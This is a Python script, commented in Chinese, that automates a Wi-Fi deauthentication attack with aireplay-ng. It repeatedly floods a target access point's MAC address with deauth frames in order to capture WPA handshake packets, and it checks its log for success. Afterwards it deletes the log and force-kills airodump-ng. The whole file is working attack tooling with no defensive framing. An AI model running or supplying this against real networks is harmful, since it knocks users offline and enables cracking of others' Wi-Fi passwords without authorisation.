# coding:utf-8
import os
import subprocess
import re
import time
"""
不断执行route攻击，搜集握手包
"""
filedir = os.path.dirname(os.path.realpath(__file__))


class ROUTE:

    def __init__(self, mac):
        # self.routeattack = os.path.join(filedir, 'routrattack', 'routeattack.log')
        self.routeattack = '/home/routeattack.log'
        self.mac = mac
        self.limit = 100

    # 保存shell的所有输出
    def writeinfotolog(self):
        cmd = 'aireplay-ng --deauth 10 -a {} wlan0mon'.format(self.mac)
        fdout = open(self.routeattack, 'a')
        fderr = open(self.routeattack, 'a')
        p = subprocess.Popen(cmd, stdout=fdout, stderr=fderr, shell=True)
        if p.poll():
            return
        p.wait()
        return

    def delthelog(self):
        cmd = 'rm -f {}'.format(self.routeattack)
        subprocess.call(cmd, shell=True)

    def killairodump(self):
        subprocess.call("ps -ef|grep airodump-ng|grep -v grep|cut -c 9-15|xargs kill -s 9", shell=True)

    def strat(self):
        count = 0
        re_route = re.compile(r'Sending DeAuth to broadcast \-\- BSSID\: \[{}\]'.format(self.mac))
        while True:
            # 防止主程序结束后还在自己运行
            if count > self.limit:
                break
            count += 1
            # 写入文件前删除可能存在的log
            self.delthelog()
            self.writeinfotolog()
            time.sleep(0.5)
            file = open(self.routeattack).read()
            router = re_route.findall(file)
            # 泛洪攻击没有成功则停0.5s继续
            if len(router) == 0:
                time.sleep(0.5)
            else:
                break
        # 删除本地的log文件
        self.delthelog()
        # 泛洪攻击成功后停止程序
        time.sleep(1)
        self.killairodump()
        return